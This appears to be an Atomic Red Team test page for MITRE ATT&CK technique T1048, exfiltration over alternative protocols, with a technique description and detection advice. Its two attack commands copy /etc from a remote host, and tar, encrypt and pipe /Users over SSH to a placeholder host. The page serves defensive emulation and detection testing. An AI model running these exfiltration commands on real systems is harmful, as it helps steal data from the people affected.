# T1048 - Exfiltration Over Alternative Protocol
Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.  

Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Different protocol channels could also include Web services such as cloud storage. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 

[Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) 

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Exfiltration Over Alternative Protocol - SSH
Input a domain and test Exfiltration over SSH

Remote to Local

Upon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.

**Supported Platforms:** macos, linux
#### Attack Commands: Run with `sh`
```sh
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
```

Invoke-AtomicTest T1048 -TestNumbers 1

### Atomic Test #2 - Exfiltration Over Alternative Protocol - SSH
Input a domain and test Exfiltration over SSH

Local to Remote

Upon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.

**Supported Platforms:** macos, linux
#### Attack Commands: Run with `sh`
```sh
tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
```

Invoke-AtomicTest T1048 -TestNumbers 2

## Detection
Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)